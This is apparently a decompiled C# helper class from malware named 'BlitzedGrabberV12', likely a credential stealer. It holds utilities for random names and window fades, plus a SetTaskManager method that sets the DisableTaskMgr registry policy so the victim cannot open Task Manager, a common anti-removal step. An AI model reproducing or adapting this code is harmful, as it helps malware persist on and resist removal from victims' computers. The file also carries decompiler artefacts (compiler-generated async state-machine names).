using System;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace BlitzedGrabberV12.Helpers
{
	// Token: 0x02000008 RID: 8
	public static class Methods
	{
		// Token: 0x06000021 RID: 33 RVA: 0x0000244C File Offset: 0x0000064C
		public static string getRandomCharacters()
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 1; i <= new Random().Next(10, 20); i++)
			{
				int index = Methods.random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length);
				stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[index]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000022 RID: 34 RVA: 0x000024A6 File Offset: 0x000006A6
		public static void Exit()
		{
			Environment.Exit(0);
		}

		// Token: 0x06000023 RID: 35 RVA: 0x000024B0 File Offset: 0x000006B0
		public static Task FadeIn(Form o, int interval = 80)
		{
			Methods.<FadeIn>d__4 <FadeIn>d__;
			<FadeIn>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<FadeIn>d__.o = o;
			<FadeIn>d__.interval = interval;
			<FadeIn>d__.<>1__state = -1;
			<FadeIn>d__.<>t__builder.Start<Methods.<FadeIn>d__4>(ref <FadeIn>d__);
			return <FadeIn>d__.<>t__builder.Task;
		}

		// Token: 0x06000024 RID: 36 RVA: 0x000024FC File Offset: 0x000006FC
		public static Task FadeOut(Form o, int interval = 80)
		{
			Methods.<FadeOut>d__5 <FadeOut>d__;
			<FadeOut>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<FadeOut>d__.o = o;
			<FadeOut>d__.interval = interval;
			<FadeOut>d__.<>1__state = -1;
			<FadeOut>d__.<>t__builder.Start<Methods.<FadeOut>d__5>(ref <FadeOut>d__);
			return <FadeOut>d__.<>t__builder.Task;
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00002548 File Offset: 0x00000748
		public static void SetTaskManager(bool enable)
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (enable && registryKey.GetValue("DisableTaskMgr") != null)
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			else
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			registryKey.Close();
		}

		// Token: 0x04000007 RID: 7
		public static readonly Random random = new Random();

		// Token: 0x04000008 RID: 8
		private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";
	}
}
